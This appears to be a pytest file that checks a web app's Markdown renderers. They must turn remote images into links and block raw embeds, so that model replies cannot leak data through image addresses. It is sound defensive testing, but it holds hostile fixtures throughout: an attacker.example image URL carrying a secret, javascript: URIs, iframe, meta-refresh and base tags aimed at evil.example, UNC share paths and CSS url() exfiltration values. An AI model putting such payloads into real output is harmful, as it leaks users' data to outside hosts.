# SPDX-FileCopyrightText: 2026 Veyllo GmbH
# SPDX-License-Identifier: AGPL-3.0-or-later
# Additional permissions and terms under AGPL Section 7: see LICENSING.md
"""Images in Markdown load only from this server's file lane (web/lib/markdownImages.ts,
web/components/Markdown.tsx).

A reply holding `![p](https://attacker.example/x.png?d=secret)` used to render an `<img>` with
that address, so the browser of whoever looked at the bubble sent the address, and whatever the
model put into it, to a foreign host. The same held for the Code Viewer's Markdown preview, the
model card preview, attached Markdown documents and the Document Editor's Markdown frame. Now an
image loads only from `/api/file`; a web image is a link marked with an image icon, anything else
its alt text, and the two frames that show Markdown carry a policy that blocks every other image
source, raw HTML included.

The renderers are the web's REAL code, transpiled with the app's own TypeScript and run in node
with react-markdown, remark-gfm and marked from web/node_modules (the pattern of
tests/test_tool_card_i18n_web.py); `ChatMarkdown` and `MarkdownPreview` are cut out of their
files as they stand. Skipped without node or web/node_modules.

MUTATIONS, each turns the named test red:
- drop `rehypeOwnImagesOnly` from the wrapper's `rehypePlugins`
  -> test_a_remote_image_in_a_bubble_is_a_link_not_an_image, test_an_image_without_alt_is_labelled_with_its_address,
     test_the_preview_and_the_model_card_follow_the_same_rule;
- drop the `insideLink` branch in `rewriteImages` (an image in a link then becomes a nested link)
  -> test_an_image_inside_a_link_is_the_links_text;
- make `ownImageSrc` skip the `normalizeDownloadHref` candidate
  -> test_own_images_load_from_the_file_lane, test_the_decision_over_hostile_and_own_sources;
- compare the origin only (drop `url.pathname === OWN_FILE_LANE`)
  -> test_the_decision_over_hostile_and_own_sources;
- drop the `walkTokens` hook of the document renderer
  -> test_an_attached_markdown_document_shows_remote_images_as_links;
- `marked.use(...)` on the shared instance instead of `new Marked(...)`
  -> test_an_attached_markdown_document_shows_remote_images_as_links (the editor's output changes);
- remove `${markdownFrameHead()}` from one DocumentViewer builder, or `${framePolicy}` from the
  editor's frame write -> test_both_markdown_frames_carry_the_policy_first;
- `img-src 'self'` or a trailing slash on the lane in `markdownFramePolicy`
  -> test_the_frame_policy_allows_only_the_file_lane;
- `import ReactMarkdown from 'react-markdown'` back in CodeViewer.tsx, or `import('marked')` back
  in DocumentEditor.tsx -> test_one_importer_per_markdown_library;
- the editor calling `renderMarkdownDocument` -> test_the_editor_keeps_the_files_markup;
- a local `normalizeDownloadHref` back in page.tsx, or `renderMarkdownLinks` back
  -> test_the_chat_uses_the_wrapper_and_the_moved_link_rule;
- render a picture link without its icon (`if (true) return <Anchor ...>` in the wrapper)
  -> test_a_remote_image_in_a_bubble_is_a_link_not_an_image;
- try the http base first (`//host/x` then reads as http)
  -> test_a_remote_image_in_a_bubble_is_a_link_not_an_image.

The frame policy itself was measured once in headless Chromium (the frames' sandbox flags, a
policy built by `markdownFramePolicy`): remote `img`, `srcset`, `video poster`, `iframe`, CSS
`url()`, `/api/file/x` and any other path of the server fetched nothing, `/api/file?path=...`
loaded. The suite has no browser, so these tests pin the policy's text and its place.
"""
import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
WEB = ROOT / "web"
LIB = WEB / "lib" / "markdownImages.ts"
WRAPPER = WEB / "components" / "Markdown.tsx"
PAGE = WEB / "app" / "page.tsx"
CODE_VIEWER = WEB / "components" / "CodeViewer.tsx"
SETTINGS = WEB / "components" / "SettingsModal.tsx"
DOC_VIEWER = WEB / "components" / "DocumentViewer.tsx"
DOC_EDITOR = WEB / "components" / "DocumentEditor.tsx"
SANITIZE = WEB / "lib" / "sanitize.ts"
LOCALES = ("en", "de", "ja", "ko", "th", "tr", "zh")


def _source(path):
    # hostile_env checks the tree out with CRLF line ends.
    return path.read_bytes().decode("utf-8").replace("\r\n", "\n")


def _slice(path, start, end):
    text = _source(path)
    i = text.index(start)
    return text[i:text.index(end, i)]


_SCRIPT = r"""
const path = require('path'), fs = require('fs');
const W = process.argv[1];
const req = require('module').createRequire(path.join(W, 'package.json'));
const ts = req('typescript'), React = req('react');
const { renderToStaticMarkup } = req('react-dom/server');
const [files, ops] = JSON.parse(fs.readFileSync(0, 'utf8'));
function load(src, stubs) {
  const js = ts.transpileModule(src, {compilerOptions: {module: ts.ModuleKind.CommonJS,
    jsx: ts.JsxEmit.React, target: ts.ScriptTarget.ES2019, esModuleInterop: true}}).outputText;
  const m = {exports: {}};
  new Function('require', 'module', 'exports', js)((id) => (id in stubs ? stubs[id] : req(id)), m, m.exports);
  return m.exports;
}
const catalogue = (locale) => JSON.parse(fs.readFileSync(path.join(W, 'messages', locale + '.json'), 'utf8'));
let messages = catalogue('en');
const stubs = {
  '@/lib/utils': {cn: (...a) => a.filter(Boolean).join(' '), getApiBase: () => ''},
  'lucide-react': new Proxy({}, {get: (_, name) => (name === '__esModule' ? undefined
    : (props) => React.createElement('svg', {'data-icon': String(name), 'aria-hidden': props['aria-hidden']}))}),
  // next-intl's useTranslations, reading the real catalogue of the current locale.
  'next-intl': {useTranslations: (ns) => (key) => {
    const value = (messages[ns] || {})[key];
    if (typeof value !== 'string') throw new Error('missing message ' + ns + '.' + key);
    return value;
  }},
  // sanitize.ts only needs DOMPurify for its DOM half; the decision it exports is pure.
  'dompurify': {__esModule: true, default: {isSupported: false}},
};
stubs['@/lib/markdownImages'] = load(files.lib, stubs);
stubs['@/components/Markdown'] = load(files.wrapper, stubs);
const lib = stubs['@/lib/markdownImages'];
const sanitize = load(files.sanitize, stubs);
const viewer = load(files.viewer, stubs);
const { Markdown } = stubs['@/components/Markdown'];
const chat = load(files.chat, stubs);
const preview = load(files.preview, stubs);
(async () => {
  const out = [];
  for (const [op, arg, extra] of ops) {
    if (op === 'locale') { messages = catalogue(arg); out.push(arg); }
    else if (op === 'markdown') out.push(renderToStaticMarkup(React.createElement(Markdown, null, arg)));
    else if (op === 'chat') out.push(renderToStaticMarkup(React.createElement(chat.ChatMarkdown, {dark: !!extra}, arg)));
    else if (op === 'preview') out.push(renderToStaticMarkup(React.createElement(preview.MarkdownPreview, {source: arg})));
    else if (op === 'own') out.push(lib.ownImageSrc(arg));
    else if (op === 'link') out.push(lib.imageLinkHref(arg));
    else if (op === 'normalize') out.push(lib.normalizeDownloadHref(arg));
    else if (op === 'doc') out.push(lib.renderMarkdownDocument(arg));
    else if (op === 'editor') out.push(await lib.renderMarkdownForEditor(arg));
    else if (op === 'global') out.push(req('marked').marked.parse(arg, {gfm: true, breaks: false}));
    else if (op === 'policy') out.push(lib.markdownFramePolicy(arg));
    else if (op === 'strip') out.push(lib.stripRawEmbeds(arg));
    else if (op === 'keep') out.push(sanitize.ownSourceValue(arg[0], arg[1], arg[2]));
    else if (op === 'isHtml') out.push(viewer.isHtmlDocument(arg));
    else throw new Error('unknown op ' + op);
  }
  process.stdout.write(JSON.stringify(out));
})().catch((e) => { console.error(e); process.exit(1); });
"""


def _run(ops):
    if shutil.which("node") is None:
        pytest.skip("node is not installed")
    for pkg in ("react-markdown", "remark-gfm", "marked", "typescript", "react-dom"):
        if not (WEB / "node_modules" / pkg).is_dir():
            pytest.skip(f"web/node_modules/{pkg} is not installed")
    chat = ("import React from 'react';\n"
            "import { Markdown } from '@/components/Markdown';\n"
            "import { normalizeDownloadHref } from '@/lib/markdownImages';\n"
            + _slice(PAGE, "/** Renders markdown in chat bubbles", "// Component: Thinking Accordion")
            + "\nexport { ChatMarkdown };\n")
    preview = ("import React from 'react';\n"
               "import { Markdown } from '@/components/Markdown';\n"
               + _slice(CODE_VIEWER, "function MarkdownPreview", "// ── Language detection")
               + "\nexport { MarkdownPreview };\n")
    # The viewer's document-kind helpers, cut out as they stand (the component itself pulls in
    # PDF and Word renderers).
    viewer = "\n".join(_slice(DOC_VIEWER, f"function {name}(", "\n}\n") + "\n}\n" for name in
                       ("extractHtmlContent", "isHtmlDocument", "isMarkdownDocument"))
    viewer = ("type DocumentViewerDocument = { name?: string; content?: string };\n" + viewer
              + "export { isHtmlDocument };\n")
    files = {"lib": _source(LIB), "wrapper": _source(WRAPPER), "chat": chat, "preview": preview,
             "sanitize": _source(SANITIZE), "viewer": viewer}
    out = subprocess.run(["node", "-e", _SCRIPT, str(WEB)], input=json.dumps([files, ops]),
                         capture_output=True, text=True, encoding="utf-8")
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout)


def _anchors(html):
    return re.findall(r"<a\b[^>]*>", html)


PICTURE_LINK_EN = "Picture on another server. Opens in a new tab."


def _visible(html):
    """The text a sighted reader sees: without the screen-reader-only note and the tags."""
    html = re.sub(r'<span class="sr-only">.*?</span>', "", html)
    return re.sub(r"<[^>]+>", "", html).strip()


SECRET = "https://attacker.example/x.png?d=secret"
REMOTE_FORMS = [
    ("inline", f"![p]({SECRET})", SECRET),
    ("reference", "![p][r]\n\n[r]: https://ref.example/z.png", "https://ref.example/z.png"),
    ("protocol-relative", "![p](//proto.example/rel.png)", "https://proto.example/rel.png"),
    ("scheme-relative", "![p](https:host.example/x.png)", "https://host.example/x.png"),
    ("own server by host", "![p](http://localhost:3000/api/file?path=a)", "http://localhost:3000/api/file?path=a"),
]


@pytest.mark.parametrize("dark", [False, True], ids=["bot", "user"])
def test_a_remote_image_in_a_bubble_is_a_link_not_an_image(dark):
    outs = _run([["chat", md, dark] for _, md, _ in REMOTE_FORMS])
    for (form, _, url), html in zip(REMOTE_FORMS, outs):
        assert "<img" not in html, f"{form}: the bubble still loads the image: {html}"
        anchors = _anchors(html)
        assert len(anchors) == 1, f"{form}: {html}"
        href = url.replace("&", "&amp;")
        assert f'href="{href}"' in anchors[0], f"{form}: {html}"
        assert 'target="_blank"' in anchors[0] and 'rel="noopener noreferrer"' in anchors[0], html
        title = re.search(r'<span title="([^"]*)"', html)
        assert title and title.group(1).split("\n") == [PICTURE_LINK_EN, href], f"{form}: hover text: {html}"
        assert 'data-icon="Image"' in html, f"{form}: no image icon: {html}"
        assert _visible(html) == "p", f"{form}: label is not the alt text: {html}"
        assert f'<span class="sr-only"> {PICTURE_LINK_EN}</span>' in html, f"{form}: nothing for a screen reader"


def test_an_image_without_alt_is_labelled_with_its_address():
    [html] = _run([["chat", "![](https://a.example/y.png)", False]])
    assert "<img" not in html
    assert _visible(html) == "https://a.example/y.png"


def test_an_image_inside_a_link_is_the_links_text():
    [html, own] = _run([
        ["chat", "[![b](https://badge.example/b.svg)](https://x.example)", False],
        ["chat", "[![b](/api/file?path=b.png)](https://x.example)", False],
    ])
    assert "<img" not in html, html
    anchors = _anchors(html)
    assert len(anchors) == 1 and 'href="https://x.example"' in anchors[0], html
    assert re.sub(r"<[^>]+>", "", html).strip() == "b", html
    # An own picture inside a link stays a picture.
    assert '<img src="/api/file?path=b.png"' in own or 'src="/api/file?path=b.png"' in own, own


OWN_FORMS = [
    ("![c](/api/file?path=out%2Fc.png)", "/api/file?path=out%2Fc.png"),
    ("![c](sandbox:/out/c.png)", "/api/file?path=out%2Fc.png"),
    ("![c](/home/user/c.png)", "/api/file?path=%2Fhome%2Fuser%2Fc.png"),
]


def test_own_images_load_from_the_file_lane():
    outs = _run([["chat", md, False] for md, _ in OWN_FORMS])
    for (md, src), html in zip(OWN_FORMS, outs):
        imgs = re.findall(r"<img\b[^>]*>", html)
        assert len(imgs) == 1, f"{md}: {html}"
        assert f'src="{src}"' in imgs[0], f"{md}: {html}"
        assert 'class="max-w-full h-auto rounded my-2"' in imgs[0] and 'alt="c"' in imgs[0], html
        assert "<a" not in html, html


HOSTILE = [
    "/api/config", "/api/files", "https://attacker.example/x.png", "//host.example/x",
    "/\\host.example/x", "https:host.example/x", "http://localhost:3000/api/file?path=a",
    "data:image/png;base64,AAAA", "blob:http://localhost:3000/abc", "javascript:alert(1)",
    "", "   ", "relative/pic.png", "ftp://host.example/x.png",
]


def test_the_decision_over_hostile_and_own_sources():
    srcs = HOSTILE + ["/api/file/../config", "/api/file?path=a.png#frag", "api/file?path=a", "C:\\Users\\a\\c.png",
                      "sandbox:/a b.png", "/home/user/c.png"]
    outs = _run([["own", s] for s in srcs])
    got = dict(zip(srcs, outs))
    for s in HOSTILE:
        if s.startswith("/") and not s.startswith(("//", "/\\")):
            # A host path is a file the links already send to the file lane; never the path itself.
            assert got[s] == "/api/file?path=" + _quote(s), (s, got[s])
        else:
            assert got[s] is None, (s, got[s])
    assert got["/api/file/../config"] == "/api/file?path=%2Fapi%2Ffile%2F..%2Fconfig"
    assert got["/api/file?path=a.png#frag"] == "/api/file?path=a.png"
    # Relative to any page of the UI this is the file lane itself; it is returned absolute.
    assert got["api/file?path=a"] == "/api/file?path=a"
    assert got["C:\\Users\\a\\c.png"] == "/api/file?path=C%3A%5CUsers%5Ca%5Cc.png"
    assert got["sandbox:/a b.png"] == "/api/file?path=a%20b.png"
    assert got["/home/user/c.png"] == "/api/file?path=%2Fhome%2Fuser%2Fc.png"
    for s, value in got.items():
        assert value is None or value.startswith("/api/file?"), (s, value)


def _quote(s):
    from urllib.parse import quote
    return quote(s, safe="~()*!.'")


def test_the_preview_and_the_model_card_follow_the_same_rule():
    md = f"![p]({SECRET})\n\n![c](sandbox:/out/c.png)\n\n[docs](https://docs.example)"
    preview, card = _run([["preview", md], ["markdown", md]])
    for name, html in (("code viewer preview", preview), ("model card", card)):
        imgs = re.findall(r"<img\b[^>]*>", html)
        assert len(imgs) == 1 and 'src="/api/file?path=out%2Fc.png"' in imgs[0], f"{name}: {html}"
        assert SECRET.replace("&", "&amp;") in html and 'data-icon="Image"' in html, f"{name}: {html}"
        for a in _anchors(html):
            assert 'target="_blank"' in a and 'rel="noopener noreferrer"' in a, f"{name}: {a}"
    # The preview keeps its own picture style.
    assert 'class="max-w-full rounded my-3"' in preview, preview
    assert "<Markdown>{modelPreviewData.card_content}</Markdown>" in _source(SETTINGS)


def test_an_attached_markdown_document_shows_remote_images_as_links():
    md = (f"![p]({SECRET})\n\n![c](/api/file?path=c.png)\n\n"
          "[![b](https://badge.example/b.svg)](https://x.example)\n\n![](https://a.example/y.png)\n\n"
          "![d](data:image/png;base64,AAAA)")
    doc, editor, glob = _run([["doc", md], ["editor", md], ["global", md]])
    imgs = re.findall(r"<img\b[^>]*>", doc)
    assert imgs == ['<img src="/api/file?path=c.png" alt="c">'], doc
    secret = SECRET.replace("&", "&amp;")
    link = re.search(r'<a href="([^"]*)" target="_blank" rel="noopener noreferrer" title="([^"]*)"><span style="white-space:nowrap">(<svg\b.*?</svg>)p</span></a>', doc)
    assert link and link.group(1) == link.group(2) == secret, doc
    # The picture cue of the UI, drawn inline: the frame loads nothing.
    assert 'aria-hidden="true"' in link.group(3) and "http://www.w3.org/2000/svg" in link.group(3)
    assert re.search(r"<svg\b", link.group(3)) and "href=" not in link.group(3) and "url(" not in link.group(3)
    assert '<a href="https://x.example">b</a>' in doc, doc
    assert "</svg>h</span>ttps://a.example/y.png</a>" in doc, doc
    assert "data:" not in doc, doc
    # The editor keeps every picture as written (its markup is saved), and the shared instance is
    # untouched by the document renderer.
    assert editor == glob
    assert f'<img src="{SECRET.replace("&", "&amp;")}" alt="p">' in editor, editor
    assert '<img src="https://badge.example/b.svg" alt="b">' in editor, editor


def test_the_frame_policy_allows_only_the_file_lane():
    good, empty, hostile = _run([["policy", "http://localhost:3000"], ["policy", ""],
                                 ["policy", 'http://x" onload="y']])
    assert good.startswith('<meta http-equiv="Content-Security-Policy" content="')
    content = good.split('content="', 1)[1].rsplit('"', 1)[0]
    directives = dict(d.strip().split(" ", 1) for d in content.split(";"))
    assert directives["default-src"] == "'none'"
    assert directives["img-src"] == "http://localhost:3000/api/file data: blob:"
    assert directives["media-src"] == "http://localhost:3000/api/file data: blob:"
    assert "'self'" not in content and "*" not in content
    for policy in (empty, hostile):
        inner = policy.split('content="', 1)[1].rsplit('"', 1)[0]
        assert "img-src data: blob:" in inner and "onload" not in policy, policy


def test_both_markdown_frames_carry_the_policy_first():
    viewer = _source(DOC_VIEWER)
    heads = re.findall(r"\(mdHtml \? `<!DOCTYPE html><html[^>]*><head>([^`]*?)</head><body>\$\{mdHtml\}", viewer)
    assert len(heads) == 2, "expected the dock and the overlay Markdown document"
    for head in heads:
        assert head.startswith("${markdownFrameHead()}"), head
    helper = _slice(DOC_VIEWER, "function markdownFrameHead()", "\n}\n")
    assert "markdownFramePolicy(" in helper and "window.location.origin" in helper
    assert viewer.count("renderMarkdownDocument(doc.content)") == 2

    editor = _source(DOC_EDITOR)
    write = re.search(r"doc\.write\(\s*`<!DOCTYPE html><html><head>([^`]*)</head><body></body></html>`", editor)
    assert write and write.group(1).startswith("${framePolicy}"), "the editor frame's head lost the policy"
    assert ("const framePolicy = isMarkdownPath(filePath) ? markdownFramePolicy(window.location.origin) : '';"
            in editor)


_IMPORT = re.compile(r"""(?:from\s+|import\s*\(\s*|require\s*\(\s*|import\s+)['"]({names})['"]""")


def test_one_importer_per_markdown_library():
    allowed = {"react-markdown": WRAPPER, "remark-gfm": WRAPPER, "marked": LIB}
    pattern = re.compile(_IMPORT.pattern.format(names="|".join(re.escape(n) for n in allowed)))
    found = {name: [] for name in allowed}
    for folder in ("app", "components", "lib", "hooks"):
        for path in sorted((WEB / folder).rglob("*")):
            if path.suffix not in (".ts", ".tsx") or path.name == "licenses_data.ts":
                continue
            for name in pattern.findall(_source(path)):
                found[name].append(path)
    for name, paths in found.items():
        where = [p.relative_to(ROOT).as_posix() for p in paths]
        assert paths == [allowed[name]], f"{name} is imported by {where}, allowed only in {allowed[name].relative_to(ROOT).as_posix()}"


def test_the_editor_keeps_the_files_markup():
    branch = _slice(DOC_EDITOR, "if (isMarkdownPath(filePath)) {\n                // Render Markdown", "savedContentRef.current = text;")
    assert "text = await renderMarkdownForEditor(text);" in branch
    assert "renderMarkdownDocument" not in _source(DOC_EDITOR)


def test_the_chat_uses_the_wrapper_and_the_moved_link_rule():
    page = _source(PAGE)
    chat = _slice(PAGE, "/** Renders markdown in chat bubbles", "// Component: Thinking Accordion")
    assert re.search(r"<Markdown\s+components=", chat) and "</Markdown>" in chat
    assert "import { normalizeDownloadHref } from '@/lib/markdownImages';" in page
    assert "const normalizeDownloadHref" not in page and "function normalizeDownloadHref" not in page
    assert "renderMarkdownLinks" not in page
    out = _run([["normalize", "sandbox:/a b"], ["normalize", "/home/user/r.pdf"],
                ["normalize", "C:\\x\\r.pdf"], ["normalize", "https://x.example/r"],
                ["chat", "[r](/home/user/r.pdf)", False]])
    assert out[:4] == ["/api/file?path=a%20b", "/api/file?path=%2Fhome%2Fuser%2Fr.pdf",
                       "/api/file?path=C%3A%5Cx%5Cr.pdf", "https://x.example/r"]
    assert 'href="/api/file?path=%2Fhome%2Fuser%2Fr.pdf"' in out[4] and "data-icon" not in out[4], out[4]


# -- round 1: share paths, raw embeds, the copies, the wording ------------------------------

UNC_OWN = [
    "/api/file?path=%5C%5Cevil.example%5Cs%5Cx.png",
    "/api/file?path=//evil.example/share/x.png",
    "/api/file?path=%5C%5C%3F%5CUNC%5Cevil.example%5Cs%5Cx.png",
    "/api/file?path=%5C%5C.%5Cpipe%5Cx",
    "/api/file?path=%5C%3F%3F%5CUNC%5Cevil.example%5Cs",
    "/api/file?path=%20%5C%5Cevil.example%5Cs%5Cx.png",
    "/api/file?path=a.png&path=%5C%5Cevil.example%5Cs%5Cx.png",
    "sandbox:\\\\evil.example\\s\\x.png",
]


def test_a_share_path_is_never_an_own_picture():
    """On Windows the server opening `\\\\host\\share` is an SMB connection to that host."""
    outs = _run([["own", s] for s in UNC_OWN] + [["chat", f"![p]({UNC_OWN[0]})", False],
                                                  ["own", "/api/file?path=C%3A%5Cx.png"]])
    for s, value in zip(UNC_OWN, outs):
        assert value is None, (s, value)
    assert "<img" not in outs[len(UNC_OWN)], outs[len(UNC_OWN)]
    assert outs[-1] == "/api/file?path=C%3A%5Cx.png"


RAW_EMBEDS = [
    '<iframe src="http://evil.example/f"></iframe>',
    '<IFRAME/src=http://evil.example/f>',
    '<ifr<iframe>ame src="http://evil.example/f">',
    '<object data="http://evil.example/o"></object>',
    '<embed src="http://evil.example/e">',
    '<portal src="http://evil.example/p"></portal>',
    '<frameset><frame src="http://evil.example/fr"></frameset>',
    '<link rel="stylesheet" href="http://evil.example/c.css">',
    '<meta http-equiv="refresh" content="0;url=http://evil.example/m">',
    '<base href="http://evil.example/">',
    '<p>text <span>inline</span> <iframe src="http://evil.example/i"></iframe> after</p>',
]


def test_raw_frames_and_head_elements_never_reach_a_markdown_frame():
    md = "\n\n".join(RAW_EMBEDS) + "\n\n<img src=\"https://evil.example/kept-for-the-policy.png\">\n"
    stripped = _run([["strip", s] for s in RAW_EMBEDS])
    for raw, out in zip(RAW_EMBEDS, stripped):
        assert "evil.example" not in out or "<" not in out.split("evil.example")[0][-40:], (raw, out)
        assert not re.search(r"<\s*/?\s*(iframe|frame|object|embed|portal|link|meta|base)\b", out, re.I), (raw, out)
    doc, editor = _run([["doc", md], ["editor", md]])
    for name, html in (("document", doc), ("editor", editor)):
        assert not re.search(r"<\s*/?\s*(iframe|frame|frameset|object|embed|portal|link|meta|base)\b", html, re.I), (name, html)
        # The raw picture stays; the frame policy blocks it (and the editor saves it as it is).
        assert "kept-for-the-policy.png" in html, (name, html)
        assert "<span>inline</span>" in html and "after" in html, (name, html)


def test_the_editor_saves_the_same_markdown_without_the_embeds():
    """The editor may drop the embeds from what it shows because the save's conversion back to
    Markdown (markdownify behind /api/file/save) drops them anyway: same file either way. Only an
    iframe left unclosed differs, and there the strip keeps MORE: unstripped, the browser reads
    everything after it as the frame's fallback text, and the save lost it."""
    markdownify = pytest.importorskip("markdownify").markdownify
    closed = [e for e in RAW_EMBEDS if not e.startswith(("<IFRAME/", "<ifr<"))]
    md = ("# Notes\n\n![chart](https://evil.example/c.png)\n\n" + "\n\n".join(closed)
          + "\n\n| a | b |\n|---|---|\n| 1 | 2 |\n")
    editor, glob = _run([["editor", md], ["global", md]])
    assert editor != glob

    def saved(html):
        return re.sub(r"\n{3,}", "\n\n", markdownify(html, heading_style="ATX")).strip() + "\n"

    # Where an inline frame sat between two spaces, the unstripped save keeps both; Markdown
    # renders a run of spaces as one, so the file reads the same.
    def spaces(text):
        return re.sub(r"[ \t]+", " ", text)

    assert spaces(saved(editor)) == spaces(saved(glob))
    assert "![chart](https://evil.example/c.png)" in saved(editor)


def test_an_entity_in_alt_text_is_escaped_once():
    doc, = _run([["doc", "![a &amp; b <i>](https://r.example/i.png) ![c &amp; d](/api/file?path=c.png)"]])
    assert "</svg>a</span> &amp; b &lt;i&gt;</a>" in doc and "&amp;amp;" not in doc, doc
    assert 'alt="c &amp; d"' in doc, doc


def test_a_markdown_file_holding_an_html_document_stays_markdown():
    page = "<!DOCTYPE html><html><body><img src=\"https://evil.example/x.png\"></body></html>"
    md_doc, markdown_doc, html_doc, txt_doc = _run([
        ["isHtml", {"name": "report.md", "content": page}],
        ["isHtml", {"name": "Report.MARKDOWN", "content": page}],
        ["isHtml", {"name": "page.html", "content": "x"}],
        ["isHtml", {"name": "notes.txt", "content": page}],
    ])
    assert (md_doc, markdown_doc, html_doc, txt_doc) == (False, False, True, True)
    # Both viewer modes (dock and overlay) choose the HTML frame through this one helper.
    viewer = _source(DOC_VIEWER)
    assert viewer.count("const htmlContent = isHtmlDocument(doc) ? extractHtmlContent(doc.content ?? '') : null;") == 2
    assert viewer.count("extractHtmlContent(") == 4  # the definition, isHtmlDocument, the two modes


DROP = None
KEEP_CASES = [
    # A src keeps the file lane's own address, never the raw value.
    (("img", "src", "/api/file?path=c.png"), "/api/file?path=c.png"),
    (("img", "src", "sandbox:/out/c.png"), "/api/file?path=out%2Fc.png"),
    (("img", "src", "/api/config"), "/api/file?path=%2Fapi%2Fconfig"),
    (("img", "src", "https://evil.example/x.png"), DROP),
    (("img", "src", "/api/file?path=%5C%5Cevil%5Cs"), DROP),
    # An inline picture fetches nothing and stays in the PDF; only on an img.
    (("img", "src", "data:image/png;base64,iVBORw0KGgo="), "data:image/png;base64,iVBORw0KGgo="),
    (("iframe", "src", "data:text/html,<p>x</p>"), DROP),
    (("img", "srcset", "/api/file?path=c.png 1x"), DROP),
    (("video", "poster", "/api/file?path=c.png"), DROP),
    (("td", "background", "https://evil.example/b.png"), DROP),
    (("source", "src", "https://evil.example/v.mp4"), DROP),
    (("image", "href", "https://evil.example/s.png"), DROP),
    (("use", "xlink:href", "https://evil.example/s.svg#a"), DROP),
    (("use", "href", "#shape"), "#shape"),
    (("a", "href", "https://example.org/doc"), "https://example.org/doc"),
    # SVG presentation attributes are CSS: a url() fetches unless it points inside the document.
    (("rect", "mask", "url(http://evil.example/c1.svg#m)"), DROP),
    (("rect", "clip-path", "url( 'http://evil.example/c2.svg#c' )"), DROP),
    (("rect", "fill", "url(http://evil.example/c4.svg#g) red"), DROP),
    (("path", "marker-end", "url(http://evil.example/m.svg#a)"), DROP),
    (("rect", "filter", "url(#blur) url(http://evil.example/f.svg#x)"), DROP),
    (("svg", "cursor", "url(http://evil.example/c.cur), auto"), DROP),
    (("rect", "fill", "u\\72l(http://evil.example/c.svg#g)"), DROP),
    (("rect", "mask", "url(#local-mask)"), "url(#local-mask)"),
    (("rect", "fill", "url( \"#grad\" )"), "url( \"#grad\" )"),
    (("rect", "fill", "#ff0000"), "#ff0000"),
    (("span", "style", "background-color: #ff0"), "background-color: #ff0"),
    (("span", "style", "background: URL(https://evil.example/b.png)"), DROP),
    (("span", "style", "background: u\\72l(https://evil.example/b.png)"), DROP),
    (("div", "style", "background-image: image-set('x.png' 1x)"), DROP),
    (("p", "align", "center"), "center"),
    (("span", "title", "C:\\Users\\a"), "C:\\Users\\a"),
]


def test_a_markdown_files_pdf_copy_keeps_only_own_sources():
    outs = _run([["keep", list(args)] for args, _ in KEEP_CASES])
    for (args, want), got in zip(KEEP_CASES, outs):
        assert got == want, (args, got)
    sanitize = _source(SANITIZE)
    assert "DOMPurify.addHook('uponSanitizeAttribute', keepOwnSource);" in sanitize
    assert "DOMPurify.removeHook('uponSanitizeAttribute', keepOwnSource);" in sanitize
    hook = _slice(SANITIZE, "function keepOwnSource(", "\n}\n")
    # The kept value is written back, so the canonical address is what the copy fetches.
    assert "if (kept === null) event.keepAttr = false;" in hook and "else event.attrValue = kept;" in hook
    own = sanitize.split("const OWN_SOURCES_COPY", 1)[1].split("};", 1)[0]
    for tag in ("'iframe'", "'object'", "'embed'", "'link'", "'meta'", "'base'"):
        assert tag in own, tag
    editor = _source(DOC_EDITOR)
    assert ("contentDiv.innerHTML = sanitizeDocumentCopy(body.innerHTML, "
            "{ ownSourcesOnly: isMarkdownPath(filePath) });") in editor


def test_the_picture_link_explains_itself_in_every_language():
    texts = {}
    for locale in LOCALES:
        catalogue = json.loads((WEB / "messages" / f"{locale}.json").read_bytes().decode("utf-8"))
        texts[locale] = catalogue["common"]["markdownPictureLink"]
        assert texts[locale].strip() and "\u2014" not in texts[locale], locale
    assert texts["de"] == "Bild auf einem anderen Server. Öffnet sich in einem neuen Tab."
    assert len(set(texts.values())) == len(LOCALES), "an untranslated copy"
    _, html = _run([["locale", "de"], ["chat", f"![p]({SECRET})", False]])
    assert f'<span class="sr-only"> {texts["de"]}</span>' in html, html
    assert re.search(r'<span title="' + re.escape(texts["de"]) + "\n", html), html


def test_the_model_card_links_look_like_links_and_long_addresses_wrap():
    long = "https://images.example.com/" + "a" * 120 + ".png"
    card, chat = _run([["markdown", f"[docs](https://docs.example)\n\n![]({long})"],
                       ["chat", f"![]({long})", False]])
    for a in _anchors(card):
        assert 'class="underline break-all"' in a, a
    for html in (card, chat):
        assert re.search(r'<span title="[^"]*" class="\[overflow-wrap:anywhere\]">', html), html


def test_the_icon_never_ends_a_line_alone():
    outs = _run([["chat", "![Quarterly diagram](https://a.example/q.png)", False],
                 ["chat", "![กิน x](https://a.example/t.png)", False]])
    first = re.search(r'<span class="whitespace-nowrap"><svg data-icon="Image" aria-hidden="true"></svg>([^<]*)</span>([^<]*)<span class="sr-only">', outs[0])
    assert first and first.groups() == ("Q", "uarterly diagram"), outs[0]
    # A combining mark stays with its letter (one grapheme), Thai here.
    thai = re.search(r'<span class="whitespace-nowrap"><svg[^>]*></svg>([^<]*)</span>', outs[1])
    assert thai and thai.group(1) == "กิ", outs[1]


def test_the_document_viewers_icon_stays_with_its_label():
    """Kept on one line with the label's first character, as in the chat; a leading character
    reference is one unit, so it is never cut into `&` and `amp;`."""
    plain, entity, thai = _run([["doc", "![Figure A](https://f.example/a.png)"],
                                ["doc", "![&amp; more](https://f.example/b.png)"],
                                ["doc", "![\u0e01\u0e34\u0e19](https://f.example/c.png)"]])
    nowrap = r'<span style="white-space:nowrap"><svg\b[^>]*>.*?</svg>([^<]*)</span>([^<]*)</a>'
    assert re.search(nowrap, plain).groups() == ("F", "igure A"), plain
    assert re.search(nowrap, entity).groups() == ("&amp;", " more"), entity
    assert re.search(nowrap, thai).group(1) == "\u0e01\u0e34", thai
